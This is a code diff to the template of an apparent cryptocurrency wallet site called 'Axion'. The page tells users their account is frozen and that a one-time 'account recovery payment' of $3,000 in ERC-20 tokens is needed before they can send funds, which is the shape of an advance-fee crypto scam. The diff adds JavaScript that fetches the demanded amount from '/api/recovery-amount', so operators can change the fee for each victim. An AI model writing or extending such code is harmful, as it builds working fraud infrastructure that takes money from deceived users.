@@ -451,7 +451,7 @@
           <strong style="font-size:14px;color:#dc2626;letter-spacing:-.01em;">Account Recovery Payment Required</strong>
         </div>
         <p style="font-size:12.5px;color:#7f1d1d;margin:0;line-height:1.6;">
-          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong>$3,000 (ERC-20)</strong> is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
+          To process your send transaction and restore full access to the send feature, a one-time account recovery payment of <strong id="recovery-amt-notice">$3,000</strong> (ERC-20) is required. This payment confirms that you are the rightful owner of this account and enables the system to unfreeze your account.
         </p>
       </div>
 
@@ -461,7 +461,7 @@
         <p style="margin:0 0 10px;">This payment is to <strong style="color:var(--text1,#1e293b);">unfreeze your account</strong> and verify ownership so you can continue to send and transact without restrictions.</p>
         <div style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;color:var(--text3,#94a3b8);margin-bottom:8px;">How It Works</div>
         <ol style="margin:0;padding-left:18px;">
-          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong>$3,000 (ERC-20)</strong>.</li>
+          <li style="margin-bottom:4px;">Pay the one-time account recovery payment of <strong id="recovery-amt-step">$3,000</strong> (ERC-20).</li>
           <li>Once confirmed on-chain, your account will be unfrozen and full access will be restored.</li>
         </ol>
       </div>
@@ -511,7 +511,7 @@
       <div style="font-size:52px;margin-bottom:12px;">⏳</div>
       <div style="font-size:17px;font-weight:800;color:var(--text1,#1e293b);margin-bottom:8px;">Recovery Payment Pending</div>
       <p style="font-size:13px;color:var(--text2,#475569);line-height:1.6;margin-bottom:18px;">
-        Your $3,000 account recovery payment is being verified.<br>
+        Your <span id="recovery-amt-pending">$3,000</span> account recovery payment is being verified.<br>
         Once confirmed, your account will be unfrozen and your send transaction processed automatically.
       </p>
       <div style="background:rgba(99,102,241,.07);border:1.5px solid rgba(99,102,241,.25);border-radius:12px;padding:12px 16px;margin-bottom:8px;">
@@ -582,7 +582,28 @@
 {% endblock %}
 
 {% block scripts %}
-<script>Axion.initHomepage();</script>
+<script>Axion.initHomepage();
+
+  // ── Load dynamic recovery amount ──────────────────────────────
+  (function loadRecoveryAmount() {
+    fetch('/api/recovery-amount')
+      .then(r => r.ok ? r.json() : null)
+      .then(data => {
+        if (!data) return;
+        const fmt = data.formatted;
+        const ids = [
+          'recovery-amt-notice', 'recovery-amt-step',
+          'recovery-amt-fee', 'recovery-amt-send', 'recovery-amt-pending'
+        ];
+        ids.forEach(id => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = fmt;
+        });
+        // Also store for submitGasFee to use
+        window._recoveryAmount = data.amount;
+      }).catch(() => {});
+  })();
+</script>
 <script>
 // ═══════════════════════════════════════════════════════
 //  HOME PAGE ACTION MODALS — Swap, Send, Receive
